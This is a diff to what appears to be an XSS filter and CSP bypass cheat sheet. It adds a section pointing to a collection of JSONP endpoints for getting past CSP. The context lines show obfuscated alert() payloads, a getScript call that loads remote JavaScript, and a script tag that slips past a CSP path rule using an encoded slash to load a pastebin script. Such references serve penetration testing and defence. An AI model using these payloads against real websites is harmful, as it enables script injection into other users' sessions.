@@ -21,6 +21,7 @@
         - [Bypass using a little known JS comment style](#bypass-using-a-little-known-js-comment-style)
     - [CSP](#csp)
         - [Bypass using encode '/' by @SecurityMB](#bypass-using-encode--by-securitymb)
+        - [Bypass using JSONP](#bypass-using-jsonp)
 
 ## DOM Based XSS
 
@@ -110,7 +111,6 @@ self["$"]["getScript"]("https://example.com/my.js");
 // Iteration and Object.keys
 Object.keys(self)[5]; // "alert"
 self[Object.keys(self)[5]]("foo"); // alert("foo")
-
 ```
 
 References:
@@ -153,3 +153,7 @@ If CSP policy points to a dir and you use `%2f` to encode `'/'`, it is still con
 <!-- this will execute -->
 <script src="https://pastebin.com/XYZ%2f..%2fraw/b0Rajxqk"></script>
 ```
+
+#### Bypass using JSONP
+
+[JSONBee](https://github.com/zigoo0/JSONBee) contains a ready to use JSONP endpoints to CSP bypass of different websites.
